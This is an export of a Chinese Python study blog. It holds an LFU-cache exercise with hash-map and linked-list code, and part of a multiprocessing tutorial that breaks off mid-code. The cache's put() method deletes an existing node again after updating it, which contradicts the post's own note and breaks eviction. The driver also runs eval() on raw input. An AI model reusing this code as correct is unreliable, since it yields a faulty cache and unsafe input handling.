<p>题目介绍：<br>缓存算法广泛存在于各种软件中，其中有一些著名的缓存方法，如LFU替换算法，LFU（Least Frequently Used）算法根据数据的历史访问频率来淘汰数据，其核心思想是“如果数据过去被访问多次，那么将来被访问的频率也更高”。LFU实现方式是这个缓存算法使用一个计数器来记录条目被访问的频率。通过使用LFU缓存算法，最低访问数的条目首先被移除。LFU的每个数据块都有一个引用计数，所有数据块按照引用计数排序，具有相同引用计数的数据块则按照时间排序。</p>
<p>LFU缓存的实现：LFU(Least Frequently Used)是根据频率维度来选择将要淘汰的元素，即删除访问频率最低的元素。如果两个元素的访问频率相同，则淘汰最久没被访问的元素。那么LFU淘汰的时候会选择两个维度，先比较频率，选择访问频率最小的元素；如果频率相同，则按时间维度淘汰掉最久远的那个元素。</p>
<p>因此，LFU可以通过两个哈希表再加上多个双链表来实现：<br>第一张哈希表是key-value的哈希表，如下图所示。其中key就是输入的key。value是一个节点对象。这个节点对象Node包含了key，value，以及频率，这个Node又会出现在第二个哈希表的value中。Node中重复包含了key，这是因为某些情况下我们不是通过key-value哈希表拿到Node的，而是通过其他方式获得了Node，之后需要用Node中的key去key-value哈希表中做一些操作，所以Node中包含了一些冗余信息。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648555550861.png"></p>
<p>第二张哈希表是频率哈希表，如下图所示。这张哈希表中的key是频率，也就是元素被访问的频率(被访问了1次，被访问了两次等)，它的value是一个双向链表，图一中的Node对象，在图二中同样存在，图二中的Node其实是双向链表中的一个节点。图一中的Node对象中包含了一个冗余的key，其实它还包含了一个冗余的频率值，因为某些情况下，我们需要通过Node对象中的频率值，去频率哈希表中做查找，所以也需要一个冗余的频率值。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648555573227.png"></p>
<p>因此，我们将两个哈希表整合可以发现，整个完整的LFU cache结构如下图所示。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648555591078.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648555605362.png"></p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> methodcaller</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    双链表中的链表节点对象</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key=<span class="literal">None</span>, value=<span class="literal">None</span>, freq=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            key:对应输入的key</span></span><br><span class="line"><span class="string">            value:对应输入的value</span></span><br><span class="line"><span class="string">            freq:被访问的频率</span></span><br><span class="line"><span class="string">            pre:指向前一个节点的指针</span></span><br><span class="line"><span class="string">            next:指向后一个节点的指针</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.value = value</span><br><span class="line">        self.freq = freq</span><br><span class="line">        self.pre = <span class="literal">None</span></span><br><span class="line">        self.<span class="built_in">next</span> = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkedList</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    自定义的双向链表</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            __head:双向链表的头结点</span></span><br><span class="line"><span class="string">            __tail:双向链表的尾节点</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.__head = Node()</span><br><span class="line">        self.__tail = Node()</span><br><span class="line">        self.__head.<span class="built_in">next</span> = self.__tail</span><br><span class="line">        self.__tail.pre = self.__head</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insertFirst</span>(<span class="params">self, node</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        将指定的节点插入到链表的第一个位置</span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            node:将要插入的节点</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        node.<span class="built_in">next</span> = self.__head.<span class="built_in">next</span></span><br><span class="line">        self.__head.<span class="built_in">next</span>.pre = node</span><br><span class="line">        self.__head.<span class="built_in">next</span> = node</span><br><span class="line">        node.pre = self.__head</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">self, node</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        从链表中删除指定的节点</span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            node:将要删除的节点</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.__head.<span class="built_in">next</span> == self.__tail:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        node.pre.<span class="built_in">next</span> = node.<span class="built_in">next</span></span><br><span class="line">        node.<span class="built_in">next</span>.pre = node.pre</span><br><span class="line">        node.<span class="built_in">next</span> = <span class="literal">None</span></span><br><span class="line">        node.pre = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getLast</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        从链表中获取最后一个节点</span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            双向链表中的最后一个节点，如果是空链表则返回None</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.__head.<span class="built_in">next</span> == self.__tail:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> self.__tail.pre</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isEmpty</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        判断链表是否为空，除了head和tail没有其他节点即为空链表</span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            链表不空返回True，否则返回False</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.__head.<span class="built_in">next</span> == self.__tail</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LFUCache</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    自定义的LFU缓存</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, capacity</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            __capacity:缓存的最大容量</span></span><br><span class="line"><span class="string">            __keyMap: key-&gt;Node 这种结构的字典</span></span><br><span class="line"><span class="string">            __freqMap:freq-&gt;LinkedList 这种结构的字典</span></span><br><span class="line"><span class="string">            __minFreq:记录缓存中最低频率</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.__capacity = capacity</span><br><span class="line">        self.__keyMap = <span class="built_in">dict</span>()</span><br><span class="line">        self.__freqMap = <span class="built_in">dict</span>()</span><br><span class="line">        self.__minFreq = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, key</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        获取一个元素，如果key不存在则返回-1，否则返回对应的value</span></span><br><span class="line"><span class="string">        同时更新被访问元素的频率</span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            key:要查找的关键字</span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            如果没找到则返回-1，否则返回对应的value</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#你的代码在这里#</span></span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> self.__keyMap:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            o_node = self.__keyMap.get(key)</span><br><span class="line">            self.__increment(o_node)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> o_node.value</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">put</span>(<span class="params">self, key, value</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        插入指定的key和value，如果key存在则更新value，同时更新频率</span></span><br><span class="line"><span class="string">        如果key不存并且缓存满了，则删除频率最低的元素，并插入新元素</span></span><br><span class="line"><span class="string">        否则，直接插入新元素</span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            key:要插入的关键字</span></span><br><span class="line"><span class="string">            value:要插入的值</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#你的代码在这里#</span></span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> self.__keyMap:</span><br><span class="line">            o_node = self.__keyMap.get(key)</span><br><span class="line">            o_node.value = value</span><br><span class="line">            self.__increment(o_node)</span><br><span class="line"></span><br><span class="line">            self.__deleteNode(o_node)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(self.__keyMap.keys())==self.__capacity:</span><br><span class="line">                self.__removeMinFreqElement()</span><br><span class="line">                n_node=Node(key, value,freq=<span class="number">1</span>)</span><br><span class="line">                self.__keyMap[key] = n_node</span><br><span class="line">                self.__increment(n_node,is_new_node=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                n_node = Node(key, value, freq=<span class="number">1</span>)</span><br><span class="line">                self.__keyMap[key] = n_node</span><br><span class="line">                self.__increment(n_node, is_new_node=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__increment</span>(<span class="params">self, node, is_new_node=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        更新节点的访问频率</span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            node:要更新的节点</span></span><br><span class="line"><span class="string">            is_new_node:是否是新节点，新插入的节点和非新插入节点更新逻辑不同</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> is_new_node:</span><br><span class="line">            self.__minFreq = <span class="number">1</span></span><br><span class="line">            self.__setDefaultLinkedList(node)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.__deleteNode(node)</span><br><span class="line">            node.freq += <span class="number">1</span></span><br><span class="line">            self.__setDefaultLinkedList(node)</span><br><span class="line">            <span class="keyword">if</span> self.__minFreq <span class="keyword">not</span> <span class="keyword">in</span> self.__freqMap:</span><br><span class="line">                self.__minFreq += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setDefaultLinkedList</span>(<span class="params">self, node</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        根据节点的频率，插入到对应的LinkedList中，如果LinkedList不存在则创建</span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            node:将要插入到LinkedList的节点</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> node.freq <span class="keyword">not</span> <span class="keyword">in</span> self.__freqMap:</span><br><span class="line">            self.__freqMap[node.freq] = LinkedList()</span><br><span class="line">        linkedList = self.__freqMap[node.freq]</span><br><span class="line">        linkedList.insertFirst(node)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__deleteNode</span>(<span class="params">self, node</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        删除指定的节点，如果节点删除后，对应的双链表为空，则从__freqMap中删除这个链表</span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            node:将要删除的节点</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> node.freq <span class="keyword">not</span> <span class="keyword">in</span> self.__freqMap:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        linkedList = self.__freqMap[node.freq]</span><br><span class="line">        freq = node.freq</span><br><span class="line">        linkedList.delete(node)</span><br><span class="line">        <span class="keyword">if</span> linkedList.isEmpty():</span><br><span class="line">            <span class="keyword">del</span> self.__freqMap[freq]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__removeMinFreqElement</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        删除频率最低的元素，从__freqMap和__keyMap中都要删除这个节点，</span></span><br><span class="line"><span class="string">        如果节点删除后对应的链表为空，则要从__freqMap中删除这个链表</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        linkedList = self.__freqMap[self.__minFreq]</span><br><span class="line">        node = linkedList.getLast()</span><br><span class="line">        linkedList.delete(node)</span><br><span class="line">        <span class="keyword">del</span> self.__keyMap[node.key]</span><br><span class="line">        <span class="keyword">if</span> linkedList.isEmpty():</span><br><span class="line">            <span class="keyword">del</span> self.__freqMap[node.freq]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    operation = <span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line">    data = <span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line">    cache = <span class="built_in">eval</span>(<span class="string">&quot;&#123;&#125;(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(operation.pop(<span class="number">0</span>), data.pop(<span class="number">0</span>)[<span class="number">0</span>]))</span><br><span class="line">    output = []</span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(operation, data):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;put&#x27;</span>:</span><br><span class="line">            methodcaller(<span class="string">&#x27;put&#x27;</span>, j[<span class="number">0</span>], j[<span class="number">1</span>])(cache)</span><br><span class="line">            output.append(<span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">elif</span> i == <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">            output.append(methodcaller(<span class="string">&#x27;get&#x27;</span>, j[<span class="number">0</span>])(cache))</span><br><span class="line">    <span class="built_in">print</span>(output)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>注意点分析</strong>：<br>1、<code>from operator import methodcaller</code>的使用</p>
<p>2、 <code>cache = eval(&quot;&#123;&#125;(&#123;&#125;)&quot;.format(operation.pop(0), data.pop(0)[0]))</code>的初始化</p>
<p>3、get时需要在keyMap提取到对应的节点，而后查看其值。同时注意<code>__increment</code>方法包含了节点的删除与插入，不需要再删除一次。</p>
<p>4、put时，需要新建一个节点（<strong>频率赋值为1</strong>），并把节点放到表里。</p>
]]></content>
      <categories>
        <category>【-基础知识-】编程语言学习</category>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python学习--ch8 进程和线程</title>
    <url>/2023/04/10/Python%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0--ch8%20%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h1><blockquote>
<p>思维导图：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648346705884.png"></p>
<h2 id="多进程multiprocess模块"><a href="#多进程multiprocess模块" class="headerlink" title="多进程multiprocess模块"></a>多进程multiprocess模块</h2><blockquote>
<p>定义引入：</p>
</blockquote>
<ul>
<li><strong>进程</strong>：就是操作系统执行的一个程序，操作系统<strong>以进程为单位分配存储空间</strong>，每个进程都有其对应的<strong>地址空间</strong>、<strong>数据栈</strong>以及其他用于跟踪进程执行的<strong>辅助数据</strong>。进程可以通过<code>fork</code>或者<code>spawn</code>创建新的进程，不过新的进程拥有单独的内存空间，所以不同进程之间要通过<code>通信机制（IPC）</code>实现数据共享，常见的通信机制包括：<code>管道</code>、<code>信号</code>、<code>套接字</code>、<code>共享内存区</code>等。</li>
<li><strong>线程</strong>：是<strong>cpu调度的执行单元</strong>，线程是定义在同一个进程下的，共享<strong>相同的上下文</strong>，所以相对于进程而言，线程之间的信息共享和通信更容易。线程<strong>共享cpu的执行时间</strong>。</li>
</ul>
<p>下图给出了进程和线程的<strong>资源对比</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648346705848.png" alt="进程"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648346705849.png" alt="线程"><br>多个线程只是具有<strong>独立的栈空间</strong>，其他数据是共享的。</p>
<p>下面给出一个<strong>类比例子</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648346705885.png"></p>
<p><strong>进程的创建</strong>：<br>Python的<code>os模块</code>中有<code>fork()</code>，通过fork可以在<strong>Linux\Unix\Mac系统</strong>下创建新的进程。但是<strong>Windows下并不支持</strong>这种方法。</p>
<blockquote>
<p><code>multiprocessing模块</code>–<strong>跨平台</strong>的多进程模块</p>
</blockquote>
<ol start="0">
<li><p>在介绍创建进程的方法之前，先来看一下<strong>Process类</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648346705815.png"></p>
</li>
<li><p>创建进程方法1：以指定的函数作为target，创建Process对象来创建新的进程。</p>
</li>
</ol>
<p><strong>代码 如下</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> time,os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Run child process is %s(%s)&quot;</span> % (name, os.getpid()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Parent Process %s&quot;</span> % os.getpid())</span><br><span class="line">    p = Process(target=fun, args=(<span class="string">&quot;xyq&quot;</span>,))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Child process will strat.&quot;</span>)</span><br><span class="line">    p.start()</span><br><span class="line">    p.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Parent finish!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649302463973.png"></p>
<p><strong>注</strong> ：此模块不支持交互式平台，所以可以在命令行或者pycharm执行。</p>
<hr>
<p><strong>再看一个例子</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> time,os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Run child process is %s(%s)&quot;</span> % (name, os.getpid()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Parent Process %s&quot;</span> % os.getpid())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        p = Process(target=fun, args=(i+<span class="number">1</span>,))</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> multiprocessing.active_children():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;child process name is :&quot;</span>+p.name+<span class="string">&quot;chile ID is :&quot;</span>+<span class="built_in">str</span>(p.pid))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;waiting all Child process finish&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> multiprocessing.active_children():</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649302868051.png"></p>
<p>看见子进程创建与调度与其创建顺序无关。</p>
<p><strong>注</strong>：使用循环创建多个进程。使用<code>active_children()</code>方法获取所有的子进程。使用<code>p.name</code>获取进程名，使用<code>p.pid</code>获取进程id.</p>
<ol start="2">
<li>继承Process类创建一个进程<br><strong>代码如下</strong>：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> time,os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">My_process</span>(<span class="title class_ inherited__">Process</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;run child process is %s(%s)&quot;</span>%(self.name, os.getpid()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Parent Process %s&quot;</span> % os.getpid())</span><br><span class="line"></span><br><span class="line">    p = My_process(<span class="string">&quot;xy1&quot;</span>)</span><br><span class="line">    p.start()</span><br><span class="line">    p.join()</span><br></pre></td></tr></table></figure>
<p><strong>结果：</strong><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649303592108.png"></p>
<p><strong>注意</strong>：<br>1、使用继承方法是构造方法使用：<code>super().__init__</code><br>2、要重写run方法。</p>
<h2 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a>进程池</h2><blockquote>
<p>pool类：进程池，可以批量创建和管理子进程。</p>
</blockquote>
<p><strong>代码：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> time,os,random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Run child process is %s(%s)&quot;</span> % (name, os.getpid()))</span><br><span class="line">    start = time.time()</span><br><span class="line">    time.sleep(random.random()*<span class="number">3</span>)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;child process %s runs %.2f seconds&quot;</span>%(name, (end-start)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Parent Process %s&quot;</span> % os.getpid())</span><br><span class="line">    p = Pool(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line"><span class="comment"># 异步非阻塞式，根据系统调度进行进程的切换</span></span><br><span class="line">        p.apply_async(fun, args=(i, ))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在调用join时需要先关闭进程池</span></span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待全部子进程执行完毕后</span></span><br><span class="line">    p.join()</span><br></pre></td></tr></table></figure>

<p><strong>结果：</strong><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649308169431.png"></p>
<p>如果使用<code>p.apply</code>采取阻塞方法，会使进程<strong>依次执行</strong>，看结果：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649308349626.png"></p>
<hr>
<p>也可以使用with方法进行进程池的创建：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> time,os,random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">name</span>):</span><br><span class="line">    myname = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(name):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(%s)process is running：%d&quot;</span>%(os.getpid(), i))</span><br><span class="line">        myname+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> myname</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Parent Process %s&quot;</span> % os.getpid())</span><br><span class="line">    <span class="keyword">with</span> Pool(<span class="number">3</span>) <span class="keyword">as</span> p:</span><br><span class="line">        result = p.<span class="built_in">map</span>(fun, (<span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>))</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：使用<code>p.map()</code>方法与前差不多，都是将参数依次传入函数。这里是创建了3个进程。</p>
<h2 id="concurrent-futures模块下的ProcessPoolExecutor类"><a href="#concurrent-futures模块下的ProcessPoolExecutor类" class="headerlink" title="concurrent.futures模块下的ProcessPoolExecutor类"></a>concurrent.futures模块下的ProcessPoolExecutor类</h2><blockquote>
<p>实现多进程并发编程：提高运行效率</p>
</blockquote>
<p><strong>一个例子:大素数求解</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n&lt;<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> n%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    sqrt_n = <span class="built_in">int</span>(math.floor(math.sqrt(n)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, sqrt_n+<span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> n%i ==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span 